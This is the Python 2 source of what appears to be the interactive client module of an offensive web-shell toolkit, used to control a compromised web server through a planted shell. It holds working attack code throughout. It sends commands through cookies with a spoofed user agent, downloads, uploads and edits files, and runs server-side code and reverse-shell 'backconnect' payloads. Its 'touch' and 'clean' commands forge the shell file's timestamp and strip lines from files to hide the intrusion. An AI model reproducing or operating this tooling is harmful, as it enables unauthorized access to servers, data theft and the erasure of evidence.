#!/usr/bin/env python

import os
import sys
import shlex

from cli import color
from cli.cli import InteractiveMixin
from modules.module import Module
from lib.io import write_file, read_file, escape, echo
from lib.io import load_script, load_script_names
from lib.io import load_eval, load_eval_names
from lib.io import load_backconnect, load_backconnect_names
from lib.shell.session import Session

from tempfile import NamedTemporaryFile
from collections import OrderedDict

class Connect(InteractiveMixin, Module):

    __module__ = '.transport.web'

    options = OrderedDict()

    options['dir'] = '~'
    options['user-agent'] = 'Mozilla/5.0'
    options['method'] = None # 'system("{}");'
    options['transport'] = 'cookie'
    options['editor'] = 'vim'

    _prompt_ = '{blue}.::{cyan}{domain}{purple}@{cyan}{ip}' \
                '{blue}::{cyan}{path}' \
                '{blue}::{purple}${white} '

    def __init__(self, shell, *args, **kwargs):
        super(Connect, self).__init__(*args, **kwargs)
        self.set_prompt(domain=shell.domain, ip=shell.ip,
                        path=self.env.get('dir','~'))
        self.transport = Session(shell.url,
                                 shell.key,
                                 shell.password,
                                 action=shell.action,
                                 handler=shell.handler)
        self.transport.user_agent = self.env.get('user-agent','Mozilla/5.0')
        self.endpoint = shell.file
        self.shell_doc_root = '~'

    def hello(self):
        data = self.script("info")
        shell_ii = data.find('[Shell]')
        path_ii = data.find('\n',shell_ii)+1
        path_nl_ii = data.find('\n',path_ii)
        path = os.path.dirname(data[path_ii:path_nl_ii])
        self.env['dir'] = path
        self.shell_doc_root = path
        return data

    def execute(self, cmds):
        return self.transport(filter(None,cmds),method=self.env.get('method'))

    def cwd(self): #CHECK
        if self.env.get('dir','~')!=self.shell_doc_root:
            return 'cd {}'.format(self.env.get('dir', self.get_path()))

    def execute_one(self, cmd):
        return self.execute([self.cwd(), cmd])

    def default_action(self, line):
        return self.execute_one(line)

    def help_cd(self):
        print ' Usage: cd [dir]'

    def do_cd(self, line):
        '''change working directory'''
        args = shlex.split(line)
        if len(args)>1:
            self.help_cd()
            return
        dir = args[0] if len(args)==1 else '~'

        if dir=='~':
            path = self.shell_doc_root
        else:
            cdir = self.env.get('dir', self.get_path())
            path = os.path.abspath(os.path.join(cdir, dir))
            dir=path

        self.env['dir'] = path
        self.set_prompt(path=dir)

    def set_dir(self, value):
        if value=='~':
            self.set_prompt(path=value)
            return self.shell_doc_root
        path = os.path.abspath(os.path.join(self.env.get('dir', self.get_path()), value))
        prompt = path
        if path==self.shell_doc_root:
            prompt='~'
        self.set_prompt(path=prompt)
        return path

    def help_download(self):
        print ' Usage: download [remote] [local]'

    def do_download(self, line):
        '''download file'''
        args = shlex.split(line)
        if len(args) not in [1,2]:
            self.help_download()
            return
        remote = args[0]
        local = args[1] if len(args)==2 else os.path.basename(remote)
        write_file(local,self.execute_one('cat {}'.format(remote)))

    def help_upload(self):
        print ' Usage: upload [local] [remote]'

    def do_upload(self, line):
        '''upload file'''
        args = shlex.split(line)
        if len(args) not in [1,2]:
            self.help_download()
            return
        local = args[0]
        remote = args[1] if len(args)==2 else os.path.basename(local)
        self.execute_one("echo '{}'>{}".format(echo(read_file(local)), remote))

    def help_edit(self):
        print ' Usage: edit [file]'

    def do_edit(self, line):
        '''edit file'''
        args = shlex.split(line)
        file = args[0] if len(args)==1 else None
        if not file:
            self.help_edit()
            return
        original = self.execute_one('cat {}'.format(file))
        tmpfile = NamedTemporaryFile(suffix=os.path.splitext(file)[1])
        write_file(tmpfile.name, original)
        os.system('{} {}'.format(self.env['editor'], tmpfile.name))
        mod = read_file(tmpfile.name)
        tmpfile.close()
        if original!=mod:
            self.execute_one("echo '{}'>{}".format(echo(mod),file))

    def help_script(self):
        print ' Usage: script [name] [outfile]'

    def script(self, script):
        try:
            script = load_script(script)
        except IOError:
            msg = 'Invalid script name {}'.format(script)
            print self.pprint(marker='!').format(msg)
            return
        cmds = [self.cwd(),] + self.script_to_cmds(script)
        return self.execute(cmds)

    def do_script(self, line):
        '''execute script'''
        args = shlex.split(line)
        if len(args) not in [1,2]:
            self.help_script()
            return
        name = args[0]
        outfile = args[1] if len(args)==2 else None
        output = self.script(name)
        if outfile:
            write_file(outfile, output)
        print output

    def script_to_cmds(self, script):
        return filter(lambda _: _ and not _.strip().startswith('#'), script.split('\n'))

    def complete_script(self, text, line, b_index, e_index):
        return self.default_complete(text, line, load_script_names)

    def help_touch(self):
        print ' Usage: touch [file]'

    def do_touch(self, line):
        '''mask shell date'''
        args = shlex.split(line)
        if len(args) not in [0,1]:
            self.help_touch()
            return
        candidate = "ls -ltr " \
                    "| tail -n +2 | head -n 1 " \
                    "| sed -r -e 's/\s+/ /g' " \
                    "| cut -d' ' -f9"
        file = args[0] if len(args)==1 else '`{}`'.format(candidate)
        lt = 'ls -lt --full-time "{}"'.format(self.endpoint)
        touch = 'touch "{}" -r "{}"'.format(self.endpoint, file)
        cmds = [lt, touch, lt]
        print self.execute(cmds)

    def help_eval(self):
        print ' Usage: eval [file [args]|{code}]'

    def complete_eval(self, text, line, b_index, e_index):
        return self.default_complete(text, line, load_eval_names)

    def eval(self, script):
        return self.transport(method=script.replace('{','{{').replace('}','}}'))

    def do_eval(self, line):
        '''run native code'''
        args = shlex.split(line)
        if len(args)==0:
            self.help_eval()
            return
        if len(args)>1 and args[0].startswith('{') and args[-1].endswith('}'):
            script = line.strip()[1:-1]
        else:
            try:
                script = load_eval(args[0])
            except IOError:
                msg = 'File {} not found'.format(args[0])
                print self.pprint(marker='!').format(msg)
                return
            for ii, arg in enumerate(args):
                if ii==0: continue
                script = script.replace('$$ARGV{}'.format(ii), arg)
        print self.eval(script)

    def option_complete_transport(self, optc=0):
        if optc==0: return self.transport.fields

    def set_transport(self, value):
        try:
            self.transport.field = value
            return value
        except TypeError:
            msg = 'Invalid value {} for transport option'.format(value)
            print self.pprint(marker='!').format(msg)
            options =  self.option_complete_transport()
            suggestion = 'Try the values {}'.format(', '.join(options))
            print self.pprint().format(suggestion)
            return self.env['transport']

    def do_clean(self, line):
        '''clean file'''
        args = shlex.split(line)
        if len(args) != 2:
            self.help_clean()
            return
        str, file = args
        self.execute_one("sed -i '/{str}/d' {file}".format(str=str, file=file))

    def help_clean(self):
        print ' Usage: clean [str] [file]'

    def complete_backconnect(self, text, line, b_index, e_index):
        return self.default_complete(text, line, load_backconnect_names)

    def help_backconnect(self):
        print ' Usage: eval [file] [[arg]]'

    def do_backconnect(self, line):
        '''execute backconnect'''
        args = shlex.split(line)
        if len(args)==0:
            self.help_backconnect()
            return
        try:
            backconnect = load_backconnect(args[0])
        except IOError:
            msg = 'File {} not found'.format(args[0])
            print self.pprint(marker='!').format(msg)
            return
        for ii, arg in enumerate(args):
            if ii==0: continue
            backconnect = backconnect.replace('$$ARGV{}'.format(ii), arg)
        print self.execute_one(backconnect)
